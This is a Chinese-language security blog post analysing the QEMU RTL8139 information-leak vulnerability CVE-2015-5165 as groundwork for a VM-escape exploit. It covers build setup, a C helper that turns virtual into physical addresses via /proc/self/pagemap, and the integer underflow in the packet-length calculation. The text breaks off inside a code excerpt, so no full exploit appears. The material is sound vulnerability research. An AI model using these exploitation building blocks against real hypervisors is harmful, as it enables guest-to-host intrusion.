<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">


  <meta name="keywords" content="QEMU,RTL8139,CVE-2015-5165,">





  <link rel="alternate" href="/atom.xml" title="程序人生" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">






<meta name="description" content="参考 Phrack 文章 VM escape - QEMU Case Study [1] 对 QEMU 信息泄露漏洞 CVE-2015-5165 和堆溢出漏洞 CVE-2015-7504 进行调试分析并编写 Exploit 代码，本文主要分析其中的 RTL8139 网卡信息泄露漏洞 CVE-2015-5165。">
<meta name="keywords" content="QEMU,RTL8139,CVE-2015-5165">
<meta property="og:type" content="article">
<meta property="og:title" content="QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用">
<meta property="og:url" content="http://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/index.html">
<meta property="og:site_name" content="程序人生">
<meta property="og:description" content="参考 Phrack 文章 VM escape - QEMU Case Study [1] 对 QEMU 信息泄露漏洞 CVE-2015-5165 和堆溢出漏洞 CVE-2015-7504 进行调试分析并编写 Exploit 代码，本文主要分析其中的 RTL8139 网卡信息泄露漏洞 CVE-2015-5165。">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://programlife.net/uploads/202006/ethernet-frame.png">
<meta property="og:image" content="http://programlife.net/uploads/202006/ip-packet.png">
<meta property="og:image" content="http://programlife.net/uploads/202006/tcp-segment.png">
<meta property="og:image" content="http://programlife.net/uploads/202006/transmit-descriptor.png">
<meta property="og:image" content="http://programlife.net/uploads/202006/vmware-svga-3d-pmio.png">
<meta property="og:image" content="http://programlife.net/uploads/202006/qemu-gdb-debug.png">
<meta property="og:image" content="http://programlife.net/uploads/202006/cve-2015-5165-poc.png">
<meta property="og:image" content="http://programlife.net/uploads/202006/cve-2015-5165-exploit.png">
<meta property="og:updated_time" content="2020-07-01T12:44:42.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用">
<meta name="twitter:description" content="参考 Phrack 文章 VM escape - QEMU Case Study [1] 对 QEMU 信息泄露漏洞 CVE-2015-5165 和堆溢出漏洞 CVE-2015-7504 进行调试分析并编写 Exploit 代码，本文主要分析其中的 RTL8139 网卡信息泄露漏洞 CVE-2015-5165。">
<meta name="twitter:image" content="http://programlife.net/uploads/202006/ethernet-frame.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/">





  <title>QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用 | 程序人生</title>
  














</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">程序人生</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Fuzzing / Vulnerability / Exploit</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ke Liu">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.webp">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="程序人生">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-30T00:13:37+00:00">
                2020-06-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Virtualization/" itemprop="url" rel="index">
                    <span itemprop="name">Virtualization</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Virtualization/QEMU/" itemprop="url" rel="index">
                    <span itemprop="name">QEMU</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>参考 Phrack 文章 <strong><em>VM escape - QEMU Case Study</em></strong> [1] 对 QEMU 信息泄露漏洞 CVE-2015-5165 和堆溢出漏洞 CVE-2015-7504 进行调试分析并编写 Exploit 代码，本文主要分析其中的 RTL8139 网卡信息泄露漏洞 CVE-2015-5165。</p>
<a id="more"></a>
<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h2><h3 id="1-1-宿主机创建"><a href="#1-1-宿主机创建" class="headerlink" title="1.1 宿主机创建"></a>1.1 宿主机创建</h3><p>在 VMware Workstation 中创建 Ubuntu 20.04 虚拟机，并为虚拟机的 CPU 开启虚拟化引擎相关选项，使之支持嵌套虚拟化，以便对 QEMU 进行调试分析。</p>
<p>安装好 Ubuntu 之后，可以先将源设置为国内的开源镜像网站，之后执行如下命令更新系统组件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get upgrade</span></span><br></pre></td></tr></table></figure>
<p>编译 QEMU 需要 Python 2，因为 Ubuntu 20.04 中只有 Python 3，所以需要自行安装 Python 2：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/bin/python2 /usr/bin/python</span></span><br></pre></td></tr></table></figure>
<p>编译 QEMU 所依赖的其他库：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-QEMU-编译"><a href="#1-2-QEMU-编译" class="headerlink" title="1.2 QEMU 编译"></a>1.2 QEMU 编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> qemu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout bd80b59</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir -p bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ../../../configure --target-list=x86_64-softmmu \</span></span><br><span class="line">    --enable-debug --disable-werror</span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure>
<p>如果出现以下错误，给文件 <code>commands-posix.c</code> 增加头文件 <code>&lt;sys/sysmacros.h&gt;</code> 即可解决 [2]。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor':</span><br><span class="line">/repo/qemu/qga/commands-posix.c:640: undefined reference to `major'</span><br><span class="line">/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor'</span><br></pre></td></tr></table></figure>
<h3 id="1-3-虚拟机创建"><a href="#1-3-虚拟机创建" class="headerlink" title="1.3 虚拟机创建"></a>1.3 虚拟机创建</h3><p>QEMU 编译完成之后，需要创建一个用于调试漏洞的虚拟机。为了调试方便，这里安装 Ubuntu 20.04 Server 版本（比较新的 Ubuntu Server 没有 32 位的版本，但这里建议安装一个 32 位的系统，因为后面的 PoC 和 Exploit 都是针对 32 位环境编写的），相关命令如下所示 [3]：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./qemu-img create -f qcow2 ~/Desktop/vm/ubuntu.img 10G</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -boot d -cdrom \</span></span><br><span class="line">    /mnt/hgfs/share/ubuntu-20.04-live-server-amd64.iso \</span><br><span class="line">    -hda ~/Desktop/vm/ubuntu.img -m 1024</span><br></pre></td></tr></table></figure>
<p>这里还需要安装一个 VNC Viewer [4]，以便远程访问虚拟机，下载 deb 安装包后使用如下命令进行安装：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb</span></span><br></pre></td></tr></table></figure>
<p>之后就可以通过 VNC Viewer 来访问虚拟机了。</p>
<h2 id="0x02-内存映射"><a href="#0x02-内存映射" class="headerlink" title="0x02. 内存映射"></a>0x02. 内存映射</h2><p>和 Host 操作系统一样，Guest 操作系统中的每个进程都有自己的虚拟地址空间，这里称之为 Guest Virtual Address，即 GVA；通过进程自身的页表（Page Table），Guest 操作系统可以将 GVA 转换为对应的 GPA（Guest Physical Address）。</p>
<p>Guest 操作系统的 GPA，实际上是对应的 QEMU 进程中映射的虚拟内存，即 HVA（Host Virtual Address）；Host 操作系统同样通过对应进程的页表，最终将其转换为对应的 HPA（Host Physical Address）。</p>
<p>待 Ubuntu Server 虚拟机安装完毕后，可以通过如下命令启动该虚拟机：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback</span><br></pre></td></tr></table></figure>
<p>这里给虚拟机分配了 2GB 的内存，可以在对应的 QEMU 进程中找到对应的虚拟内存：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -e|grep qemu</span></span><br><span class="line">   4407 pts/1    00:01:14 qemu-system-x86</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/4407/maps</span></span><br><span class="line">......</span><br><span class="line">7fe880021000-7fe884000000 ---p 00000000 00:00 0 </span><br><span class="line">7fe884000000-7fe904000000 rw-p 00000000 00:00 0         [2GB RAM]</span><br><span class="line">7fe904000000-7fe90465d000 rw-p 00000000 00:00 0 </span><br><span class="line">......</span><br><span class="line">7ffc9f4a1000-7ffc9f4c2000 rw-p 00000000 00:00 0         [stack]</span><br><span class="line">7ffc9f4fd000-7ffc9f500000 r--p 00000000 00:00 0         [vvar]</span><br><span class="line">7ffc9f500000-7ffc9f501000 r-xp 00000000 00:00 0         [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure>
<p>关于 Guest Virtual Address 到 Host Virtual Address 的转换，Phrack 的文章没怎么解释，在网上找到另一篇文章 [5] 解释的比较清楚（以 64 位系统为例）：</p>
<ol>
<li><p>每个页面的大小为 <code>4096</code> 字节，即 <code>1 &lt;&lt; 12</code> ；</p>
</li>
<li><p>基于 <code>/proc/pid/pagemap</code> 可以查看进程任意 Virtual Page 的状态，包括是否被映射到物理内存以及在物理内存中的 Page Frame Number（PFN）等；</p>
<ul>
<li><code>pagemap</code> 文件为每个 Virtual Page 存储 <code>64</code> 位（即 <code>8</code> 字节）的信息，数据格式如下：</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Bits 0-54  page frame number (PFN) if present</span><br><span class="line">Bits 0-4   swap type if swapped</span><br><span class="line">Bits 5-54  swap offset if swapped</span><br><span class="line">Bit  55    pte is soft-dirty</span><br><span class="line">Bit  56    page exclusively mapped (since 4.2)</span><br><span class="line">Bits 57-60 zero</span><br><span class="line">Bit  61    page is file-page or shared-anon (since 3.5)</span><br><span class="line">Bit  62    page swapped</span><br><span class="line">Bit  63    page present</span><br></pre></td></tr></table></figure>
<ol start="3">
<li><p>对任意的虚拟地址 <code>address</code> ，基于 <code>address / 4096</code> 可以计算出该虚拟地址在 <code>pagemap</code> 文件中的索引值， <code>address / 4096 * 8</code> 即对应的文件偏移值；</p>
</li>
<li><p>对任意的虚拟地址 <code>address</code> ，<code>address % 4096</code> 即虚拟地址在对应的内存页中的偏移值；</p>
</li>
<li><p>基于物理内存的 PFN 以及页内偏移，就可以计算出对应的物理地址；</p>
</li>
</ol>
<p>获取虚拟地址对应的物理地址的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_addr(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(ptr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)ptr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* ptr = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">"Where am I?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Physical address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, get_physical_addr(ptr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press any key to exit...\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据文档 [6] 可知，只有拥有 <code>CAP_SYS_ADMIN</code> 权限的进程才可以读取到 PFN，否则虽然可以打开 <code>pagemap</code> 文件，但是读取到的 PFN 将会是 <code>0</code> 。</p>
<blockquote>
<p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.<br>In 4.0 and 4.1 opens by unprivileged fail with -EPERM.  Starting from<br>4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.<br>Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p>
</blockquote>
<p>编译好程序之后将其上传到 QEMU 虚拟机中以 <code>root</code> 身份执行，打印出物理地址为 <code>0x617192a0</code> ：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">Where am I?</span><br><span class="line">Physical address: 0x617192a0</span><br><span class="line">Press any key to exit...</span><br></pre></td></tr></table></figure>
<p>在宿主机中使用 GDB 附加到 QEMU 进程，可以看到虚拟机中的物理地址实际上就是 QEMU 进程为虚拟机分配的内存所在的 Host Virtual Address 的偏移地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo gdb qemu-system-x86 4407</span></span><br><span class="line">(gdb) x /s 0x7fe884000000 + 0x617192a0</span><br><span class="line">0x7fe8e57192a0:	"Where am I?"</span><br></pre></td></tr></table></figure>
<h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03. 漏洞分析"></a>0x03. 漏洞分析</h2><h3 id="3-1-漏洞简介"><a href="#3-1-漏洞简介" class="headerlink" title="3.1 漏洞简介"></a>3.1 漏洞简介</h3><p>CVE-2015-5165 是 QEMU 在模拟 Realtek RTL8139 网卡时存在的一个漏洞，具体为文件 <code>hw\net\rtl8139.c</code> 中的函数 <code>rtl8139_cplus_transmit_one</code> 在发送数据时没有检查 IP 数据包头部的长度 <code>hlen</code> 与整个 IP 数据包的长度 <code>ip-&gt;ip_len</code> 之间的关系，导致在计算数据长度的时候存在整数溢出：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*uint16_t*/</span> ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br></pre></td></tr></table></figure>
<p>利用该漏洞可以把越界读取到的数据通过网络发送出去。</p>
<h3 id="3-2-基础知识"><a href="#3-2-基础知识" class="headerlink" title="3.2 基础知识"></a>3.2 基础知识</h3><h4 id="3-2-1-Ethernet-Frame-Format"><a href="#3-2-1-Ethernet-Frame-Format" class="headerlink" title="3.2.1 Ethernet Frame Format"></a>3.2.1 Ethernet Frame Format</h4><p>OSI（Open Systems Interconnection）将网络协议分为七层，从上往下依次为：</p>
<ul>
<li>应用层</li>
<li>表示层</li>
<li>会话层</li>
<li>传输层</li>
<li>网络层</li>
<li>数据链路层</li>
<li>物理层</li>
</ul>
<p>以太网帧（Ethernet Frame）在数据链路层传输，格式参考下图中的灰色部分 [7]：</p>
<p><img src="/uploads/202006/ethernet-frame.png" alt="Ethernet Frame Format"></p>
<p>相关字段解释：</p>
<ul>
<li>DST / SRC 为目标 / 源的 MAC 地址</li>
<li><p>Length / Type：</p>
<ul>
<li>如果值小于等于 <code>1500</code> ，则表示 Payload 的长度</li>
<li>否则表示 Payload 数据所使用的协议，比如 <code>0x0800</code> 表示 IP 协议（这里指 IPv4）</li>
</ul>
</li>
<li><p>Payload 的 MTU（Maximum Transmission Unit）为 <code>1500</code> 字节，当数据超出 MTU 时需要进行分片处理</p>
</li>
</ul>
<h4 id="3-2-2-IP-Packet-Format"><a href="#3-2-2-IP-Packet-Format" class="headerlink" title="3.2.2 IP Packet Format"></a>3.2.2 IP Packet Format</h4><p>IP 数据包（这里指 IPv4）在网络层传输，格式参考下图 [7]：</p>
<p><img src="/uploads/202006/ip-packet.png" alt="IP Packet Format"></p>
<p>相关字段解释：</p>
<ul>
<li>IHL（Internet Header Length）表示 IP Header 的长度，最大可以是 <code>0b1111 * 4 = 60</code> 字节</li>
<li>Total Length 表示整个 IP Packet 的长度，最大可以是 <code>65535</code> 字节</li>
<li>IP Data 的最大长度为 <code>65535 - 20 = 65515</code> 字节<ul>
<li>此时 IP Header 的长度为 <code>20</code> 字节，Options 字段的长度为 <code>0</code> 字节</li>
</ul>
</li>
</ul>
<h4 id="3-2-3-TCP-Segment-Format"><a href="#3-2-3-TCP-Segment-Format" class="headerlink" title="3.2.3 TCP Segment Format"></a>3.2.3 TCP Segment Format</h4><p>TCP 报文在传输层传输，格式参考下图 [7]：</p>
<p><img src="/uploads/202006/tcp-segment.png" alt="TCP Segment Format"></p>
<p>和 IP 数据包一样，TCP 报文头部的长度由 <code>Header Length</code> 字段指明，最大可以是 <code>0b1111 * 4 = 60</code> 字节，在 <code>Options</code> 字段为空的情况下头部长度为 <code>20</code> 字节。</p>
<h3 id="3-3-漏洞分析"><a href="#3-3-漏洞分析" class="headerlink" title="3.3 漏洞分析"></a>3.3 漏洞分析</h3><p>漏洞位于文件 <code>hw\net\rtl8139.c</code> 中的函数 <code>rtl8139_cplus_transmit_one</code> ，相关代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_ADDR_LEN 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_TYPE_LEN 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HLEN (ETHER_ADDR_LEN * 2 + ETHER_TYPE_LEN)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_IP    0x0800      <span class="comment">/* Internet Protocol packet */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_8021Q 0x8100      <span class="comment">/* 802.1Q VLAN Extended Header  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_MTU     1500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ip packet header */</span></span><br><span class="line">ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> 